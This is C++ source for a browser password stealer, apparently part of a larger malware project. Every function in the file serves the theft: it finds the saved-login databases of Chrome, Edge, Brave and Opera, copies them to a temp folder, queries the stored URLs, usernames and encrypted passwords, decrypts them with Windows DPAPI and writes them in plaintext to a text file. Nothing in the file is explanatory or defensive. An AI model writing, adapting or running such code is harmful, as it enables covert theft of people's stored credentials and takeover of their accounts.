#include "browsers.h"
#include "utils.h"

#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <vector>
#include <fstream>
#include <sqlite3.h>       
#include <wincrypt.h>      

struct LoginData {
    std::string origin_url;
    std::string username;
    std::string password;
};

const std::vector<std::string> browsers = {
    R"(Google\Chrome\User Data\Default)",
    R"(Microsoft\Edge\User Data\Default)",
    R"(BraveSoftware\Brave-Browser\User Data\Default)",
    R"(Opera Software\Opera Stable)"
};

static std::string get_local_appdata() {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        return std::string(path);
    }
    return "";
}

static std::string copy_login_db(const std::string& src) {
    std::string tempPath = create_temp_directory("b0nec0me_tmp");
    std::string dest = tempPath + "LoginDataCopy.db";

    try {
        std::filesystem::copy_file(src, dest, std::filesystem::copy_options::overwrite_existing);
        return dest;
    } catch (...) {
        return "";
    }
}

static std::string decrypt_password(const std::vector<unsigned char>& encrypted) {
    DATA_BLOB inBlob;
    inBlob.pbData = const_cast<BYTE*>(encrypted.data());
    inBlob.cbData = (DWORD)encrypted.size();

    DATA_BLOB outBlob;
    if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, 0, &outBlob)) {
        std::string decrypted((char*)outBlob.pbData, outBlob.cbData);
        LocalFree(outBlob.pbData);
        return decrypted;
    }
    return "";
}

void dump_browser_passwords(const std::string& outputFolder) {
    std::string localAppData = get_local_appdata();
    if (localAppData.empty()) return;

    std::ofstream outFile(outputFolder + "browser_passwords.txt", std::ios::out | std::ios::app);

    for (const auto& basePath : browsers) {
        std::string loginDataPath = localAppData + "\\" + basePath + "\\Login Data";
        if (!std::filesystem::exists(loginDataPath)) continue;

        std::string dbCopy = copy_login_db(loginDataPath);
        if (dbCopy.empty()) continue;

        sqlite3* db;
        if (sqlite3_open(dbCopy.c_str(), &db) != SQLITE_OK) {
            sqlite3_close(db);
            continue;
        }

        const char* query = "SELECT origin_url, username_value, password_value FROM logins";
        sqlite3_stmt* stmt;

        if (sqlite3_prepare_v2(db, query, -1, &stmt, NULL) != SQLITE_OK) {
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            continue;
        }

        while (sqlite3_step(stmt) == SQLITE_ROW) {
            const unsigned char* url = sqlite3_column_text(stmt, 0);
            const unsigned char* user = sqlite3_column_text(stmt, 1);
            const void* password_blob = sqlite3_column_blob(stmt, 2);
            int password_size = sqlite3_column_bytes(stmt, 2);

            if (url && user && password_blob && password_size > 0) {
                std::vector<unsigned char> encrypted_password(
                    (const unsigned char*)password_blob,
                    (const unsigned char*)password_blob + password_size);

                std::string decrypted = decrypt_password(encrypted_password);

                if (!decrypted.empty()) {
                    outFile << "URL: " << url << "\n";
                    outFile << "Username: " << user << "\n";
                    outFile << "Password: " << decrypted << "\n";
                    outFile << "------------------------------\n";
                }
            }
        }

        sqlite3_finalize(stmt);
        sqlite3_close(db);

        std::filesystem::remove(dbCopy);
    }

    outFile.close();
}
